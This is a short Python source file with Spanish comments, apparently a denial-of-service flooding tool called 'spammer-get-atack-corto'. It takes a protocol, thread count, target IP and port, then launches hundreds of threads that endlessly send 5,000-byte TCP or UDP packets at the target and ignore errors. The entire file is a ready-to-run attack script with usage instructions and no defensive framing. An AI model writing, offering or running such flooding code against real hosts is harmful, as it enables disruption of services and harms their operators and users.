# --- START OF FILE spammer-get-atack-corto.py ---

import socket
import threading
import sys
import time

# --- 1. VALIDACIÓN DE ARGUMENTOS ---
# Se comprueba si el número de argumentos es correcto para evitar un error de IndexError.
if len(sys.argv) != 5:
    print(f"""
    Error de parámetros. Uso correcto:
    python3 {sys.argv[0]} <protocolo> <hilos> <ip> <puerto>

    <protocolo>: tcp o udp
    <hilos>:     número de hilos concurrentes (ej: 500)
    <ip>:        IP del objetivo
    <puerto>:    puerto del objetivo
    """)
    sys.exit()

# --- 2. ASIGNACIÓN DE VARIABLES ---
# Se guardan los argumentos en variables con nombres claros y se convierte el tipo de dato.
protocolo = sys.argv[1].lower()
hilos = int(sys.argv[2])
ip = sys.argv[3]
puerto = int(sys.argv[4])

if protocolo not in ['tcp', 'udp']:
    print("Error: El protocolo debe ser 'tcp' o 'udp'.")
    sys.exit()

# --- 3. PAYLOAD ---
# Se crea una carga de datos (payload) grande. Usamos bytes (b'') directamente.
payload = (b'A' * 1000) * 5  # Payload de 5000 bytes

# --- 4. FUNCIÓN DE ATAQUE (EJECUTADA POR CADA HILO) ---
# Esta función contiene la lógica del ataque, simplificada en un solo lugar.
def atacar():
    while True:
        try:
            if protocolo == 'tcp':
                # Para TCP, se crea una conexión en cada intento
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, puerto))
                s.sendall(payload) # sendall es más robusto para TCP
                s.close()
            else:  # protocolo == 'udp'
                # Para UDP, solo se envía el paquete
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, puerto))
            
            print(f"Paquete enviado a {ip}:{puerto}")

        except Exception:
            # Si hay un error (ej: conexión rechazada), simplemente se ignora y se vuelve a intentar.
            pass

# --- 5. INICIO DEL ATAQUE ---
print(f"Iniciando ataque a {ip}:{puerto} con {hilos} hilos ({protocolo.upper()}). Presiona Ctrl+C para detener.")

for i in range(hilos):
    # Se crea un hilo que ejecutará la función atacar.
    # daemon=True permite que el programa principal termine sin esperar a los hilos.
    hilo = threading.Thread(target=atacar, daemon=True)
    hilo.start()

# --- 6. MANTENER EL SCRIPT VIVO Y PERMITIR DETENCIÓN ---
# Este bucle mantiene el script principal activo mientras los hilos atacan en segundo plano.
# Captura la interrupción por teclado (Ctrl+C) para una salida limpia.
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[INFO] Ataque detenido por el usuario.")
    sys.exit(0)
